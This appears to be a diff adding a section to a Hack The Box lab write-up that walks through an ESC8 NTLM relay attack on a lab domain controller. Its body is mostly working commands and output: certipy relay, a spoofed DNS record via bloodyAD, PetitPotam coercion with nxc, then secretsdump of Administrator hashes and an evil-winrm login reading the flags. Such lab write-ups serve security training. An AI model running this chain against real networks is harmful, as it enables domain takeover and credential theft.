@@ -141,8 +141,91 @@ Some of the share had photos. one of the users Rosie.Powell had a photo where on
 
 Now that we have the first credentials our main goal is to discover the next step.
 
+# ESC8 Vulnerability (NTLM relay attack)
 
+First we start with the initial certipy find enumeration that suggests that the exploit is ESC8
 
+This is the ESC8 condition: an attacker who can coerce or relay any authentication into this endpoint can request a certificate on behalf of the relayed identity.
 
+So there were three separate problems we needed to solve: 
+1) Start the relay attack
+2) use tool like bloodyAD in order to add our VPN as a DNS which matched cicada.vl subdomain.
+3) Use crackmapexec/nxc with the petitpotam techniques in order to receive back dc-jpq225.pfx which then would help us to get the administrator hash
 
+Note: Always update clock skew using sudo ntupdate <ip> before running any of the commands so that there would be no issue
 
+```
+Start the relay attack
+certipy relay -target 'http://dc-jpq225.cicada.vl/' -template DomainController
+
+Add our custom domain using bloodyAD:
+bloodyAD -u Rosie.Powell -p Cicada123 -d cicada.vl -k --host DC-JPQ225.cicada.vl add dnsRecord DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA 10.10.15.2
+
+Use nxc with the petitpotam method:
+nxc smb DC-JPQ225.cicada.vl -u 'Rosie.Powell' -p 'Cicada123' -d cicada.vl -k -M coerce_plus -o LISTENER=DC-JPQ2251UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAYBAAAA METHOD=PetitPotam
+
+In the relay it should show if not(check all of the steps update clock, i had to try those commands for 3 hours until it worked):
+[*] Targeting http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp (ESC8)
+[*] Listening on 0.0.0.0:445
+[*] Setting up SMB Server on port 445
+[*] (SMB): Received connection from 10.129.94.98, attacking target http://dc-jpq225.cicada.vl
+[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
+[*] (SMB): Authenticating connection from /@10.129.94.98 against http://dc-jpq225.cicada.vl SUCCEED [1]
+[*] Requesting certificate for '\\' based on the template 'DomainController'
+[*] (SMB): Received connection from 10.129.94.98, attacking target http://dc-jpq225.cicada.vl
+[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 401 Unauthorized"
+[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: POST http://dc-jpq225.cicada.vl/certsrv/certfnsh.asp "HTTP/1.1 200 OK"
+[*] Certificate issued with request ID 88
+[*] Retrieving certificate for request ID: 88
+[*] http:///@dc-jpq225.cicada.vl [1] -> HTTP Request: GET http://dc-jpq225.cicada.vl/certsrv/certnew.cer?ReqID=88 "HTTP/1.1 200 OK"
+[*] Got certificate with DNS Host Name 'DC-JPQ225.cicada.vl'
+[*] Certificate object SID is 'S-1-5-21-687703393-1447795882-66098247-1000'
+[*] Saving certificate and private key to 'dc-jpq225.pfx'
+[*] Wrote certificate and private key to 'dc-jpq225.pfx'
+[*] Exiting...
+
+```
+
+After that we are going to get our tgt ticket and use secretsdump to get the hash of the admin
+```
+certipy auth -pfx dc-jpq225.pfx -dc-ip 10.129.94.98
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN DNS Host Name: 'DC-JPQ225.cicada.vl'
+[*]     Security Extension SID: 'S-1-5-21-687703393-1447795882-66098247-1000'
+[*] Using principal: 'dc-jpq225$@cicada.vl'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'dc-jpq225.ccache'
+[*] Wrote credential cache to 'dc-jpq225.ccache'
+[*] Trying to retrieve NT hash for 'dc-jpq225$'
+[*] Got hash for 'dc-jpq225$@cicada.vl': aad3b435b51404eeaad3b435b51404ee:a65952c664e9cf5de60195626edbeee3
+
+export KRB5CCNAME=dc-jpq225.ccache
+/usr/bin/impacket-secretsdump -k -no-pass -dc-ip 10.129.94.98 'cicada.vl/dc-jpq225$'@DC-JPQ225.cicada.vl -just-dc-user Administrator 
+Impacket v0.13.1 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:85a0da53871a9d56b6cd05deda3a5e87:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:f9181ec2240a0d172816f3b5a185b6e3e0ba773eae2c93a581d9415347153e1a
+Administrator:aes128-cts-hmac-sha1-96:926e5da4d5cd0be6e1cea21769bb35a4
+Administrator:des-cbc-md5:fd2a29621f3e7604
+[*] Cleaning up... 
+
+```
+Now we can log in as admin(and even that you can't just log in with admin and hash because the server isn't checking whether your hash is right — it's refusing the whole method of login before it even looks at the hash. TBH I still fully don't understand why)
+```
+export KRB5CCNAME=/home/kali/Desktop/HTB/Labs/VulnCicada/Administrator.ccache
+evil-winrm -i DC-JPQ225.cicada.vl -r cicada.vl -K /home/kali/Desktop/HTB/Labs/VulnCicada/Administrator.ccache
+
+*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\dc-jpq225\profiles$> type C:\Users\Administrator\Desktop\user.txt
+99324d1fe0bc22b4e6361a64dacd1e2f
+*Evil-WinRM* PS Microsoft.PowerShell.Core\FileSystem::\\dc-jpq225\profiles$> type C:\Users\Administrator\Desktop\root.txt
+9c566e43fc85f2865431737d3f3665c8
+```
